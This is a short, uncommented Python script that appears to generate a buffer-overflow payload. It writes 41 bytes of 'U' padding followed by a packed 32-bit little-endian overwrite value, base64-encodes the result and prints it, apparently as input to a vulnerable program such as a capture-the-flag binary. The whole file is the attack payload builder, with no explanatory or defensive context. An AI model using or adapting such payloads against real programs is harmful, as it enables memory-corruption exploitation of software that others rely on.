
import sys
import struct
import base64

buf = b'UUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUU'
buf += struct.pack('<I', 3716825027)
buf = base64.b64encode(buf)
buf += b'\n'

sys.stdout.buffer.write(buf)
